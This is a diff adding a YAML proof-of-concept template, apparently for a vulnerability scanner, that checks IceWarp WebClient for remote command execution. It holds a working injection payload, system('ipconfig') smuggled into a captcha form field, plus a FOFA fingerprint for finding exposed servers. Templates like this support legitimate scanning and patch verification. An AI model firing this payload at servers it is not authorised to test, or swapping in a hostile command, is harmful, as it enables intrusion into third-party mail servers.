@@ -1,0 +1,27 @@
+id: poc-yaml-icewarp-webclient-basic-rce
+info:
+  name: IceWarp WebClient basic 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: webclient
+  fofa: body="Powered by IceWarp"
+requests:
+- method: POST
+  path: /webmail/basic/
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: _dlg[captcha][target]=system(\'ipconfig\')\
+  expression: 'status_code == 302 &&
+
+    contains(body,"Windows IP") &&
+
+    contains(body,"DNS") &&
+
+    contains(headers,"IceWarp") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
